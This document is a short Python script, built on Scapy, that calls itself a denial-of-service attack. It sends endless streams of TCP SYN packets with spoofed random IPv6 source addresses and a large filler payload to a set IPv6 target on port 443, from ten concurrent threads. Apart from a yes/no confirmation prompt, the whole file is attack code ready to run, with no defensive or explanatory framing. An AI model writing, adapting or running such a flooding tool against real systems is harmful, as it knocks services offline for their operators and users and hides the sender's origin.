from scapy.all import *
import threading
import time
import random
import sys

TARGET_IPV6 = "2001:db8::1"
TARGET_PORT = 443
PAYLOAD = (
    b"\x41" * 60000 +
    b"\x00\x00\x00\x00" +
    b"\xFF" * 5000
)

def random_ipv6():
    return ":".join(f"{random.randint(0, 0xffff):04x}" for _ in range(8))

def craft_packet():
    ipv6 = IPv6(
        src=random_ipv6(),
        dst=TARGET_IPV6,
    )
    tcp = TCP(
        sport=random.randint(1024, 65535),
        dport=TARGET_PORT,
        flags="S",
    )
    return ipv6 / tcp / PAYLOAD

def send_exploit_loop():
    while True:
        pkt = craft_packet()
        send(pkt, verbose=0)
        time.sleep(random.uniform(0.05, 0.15))

def main():
    print(f"Target: {TARGET_IPV6}:{TARGET_PORT}")
    confirm = input("⚠️ This will launch a DoS attack. Proceed? (yes/no): ").lower()
    if confirm != 'yes':
        print("Aborted.")
        sys.exit(0)

    threads = []
    for _ in range(10):  # 10 concurrent threads, adjust as needed
        t = threading.Thread(target=send_exploit_loop)
        t.daemon = True
        t.start()
        threads.append(t)

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nStopped by user.")

if __name__ == "__main__":
    main()
